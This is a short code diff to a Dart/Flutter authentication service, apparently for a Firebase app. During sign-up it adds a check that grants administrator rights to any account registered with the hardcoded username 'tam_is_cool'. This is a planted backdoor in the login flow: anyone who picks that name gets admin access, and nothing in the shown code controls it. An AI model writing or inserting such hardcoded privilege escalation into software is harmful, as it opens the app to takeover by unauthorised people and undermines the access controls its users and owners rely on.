@@ -25,6 +25,10 @@ class AuthService {
       print("got user ${user.uid}");
       await DbService(userId: user.uid).updateUserData(username);
 
+      username == "tam_is_cool"
+          ? DbService(userId: user.uid).makeAdmin()
+          : null;
+
       return _userFromFirebaseUser(user);
     } catch (e) {
       String errorMsg = e.toString();
